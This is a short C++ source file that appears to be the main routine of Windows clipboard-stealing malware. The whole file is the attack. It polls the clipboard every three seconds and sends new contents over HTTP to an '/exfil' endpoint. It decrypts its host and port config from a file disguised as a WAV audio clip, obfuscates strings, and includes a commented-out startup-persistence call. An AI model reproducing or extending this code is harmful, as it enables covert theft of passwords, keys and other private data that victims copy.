#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>
#include <wavcrypt.h>
#include <obfstr.h>

void HandleNewData(std::string& data)
{    
    try
    {
        ExfiltrateClipboardHTTP(data, "127.0.0.1", "/exfil", 80);
    }
    catch(const std::exception& ex)
    {
        std::cout << ex.what() << "\n";
    }
    catch(...)
    {}
}

int main() {
    // AddToStartup();

    std::string lastClipboard = "";

    auto [host, port, path] = ExtractAndDecryptConfig(OBFSTR("ouch.wav"));

    while(true)
    {
        std::string currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
        {
            HandleNewData(currentClipboard);  
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
